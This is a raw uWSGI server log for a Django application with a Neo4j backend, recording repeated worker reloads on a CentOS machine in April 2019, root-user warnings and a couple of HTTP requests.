uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x186e1c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 18214, cores: 2)
spawned uWSGI worker 2 (pid: 18215, cores: 2)
spawned uWSGI worker 3 (pid: 18216, cores: 2)
spawned uWSGI worker 4 (pid: 18217, cores: 2)
Python auto-reloader enabled
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 18215|app: 0|req: 1/1] 45.76.144.219 () {36 vars in 421 bytes} [Mon Apr 22 10:17:56 2019] GET / => generated 12678 bytes in 782 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
Mon Apr 22 10:20:26 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 18214)...
Gracefully killing worker 2 (pid: 18215)...
Gracefully killing worker 3 (pid: 18216)...
Gracefully killing worker 4 (pid: 18217)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:20:27 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0xe821c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe821c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 20194, cores: 2)
spawned uWSGI worker 2 (pid: 20195, cores: 2)
spawned uWSGI worker 3 (pid: 20196, cores: 2)
spawned uWSGI worker 4 (pid: 20197, cores: 2)
Python auto-reloader enabled
Mon Apr 22 10:20:34 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 20194)...
Gracefully killing worker 2 (pid: 20195)...
Gracefully killing worker 3 (pid: 20196)...
Gracefully killing worker 4 (pid: 20197)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:20:35 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x29c31c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x29c31c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 20223, cores: 2)
spawned uWSGI worker 2 (pid: 20224, cores: 2)
spawned uWSGI worker 3 (pid: 20225, cores: 2)
spawned uWSGI worker 4 (pid: 20226, cores: 2)
Python auto-reloader enabled
Mon Apr 22 10:26:43 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 20223)...
Gracefully killing worker 2 (pid: 20224)...
Gracefully killing worker 3 (pid: 20225)...
Gracefully killing worker 4 (pid: 20226)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:26:44 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x280d1c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x280d1c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 20830, cores: 2)
spawned uWSGI worker 2 (pid: 20831, cores: 2)
spawned uWSGI worker 3 (pid: 20832, cores: 2)
spawned uWSGI worker 4 (pid: 20833, cores: 2)
Python auto-reloader enabled
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
Not Found: /404/search_children.js
[pid: 20831|app: 0|req: 1/1] 120.132.3.65 () {34 vars in 500 bytes} [Mon Apr 22 10:28:41 2019] GET /404/search_children.js => generated 11110 bytes in 895 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
...gracefully killing workers...
Gracefully killing worker 1 (pid: 20830)...
Gracefully killing worker 2 (pid: 20831)...
Gracefully killing worker 3 (pid: 20832)...
Gracefully killing worker 4 (pid: 20833)...
[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:29:09 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0xe581c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe581c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 21108, cores: 2)
spawned uWSGI worker 2 (pid: 21109, cores: 2)
spawned uWSGI worker 3 (pid: 21110, cores: 2)
spawned uWSGI worker 4 (pid: 21111, cores: 2)
Python auto-reloader enabled
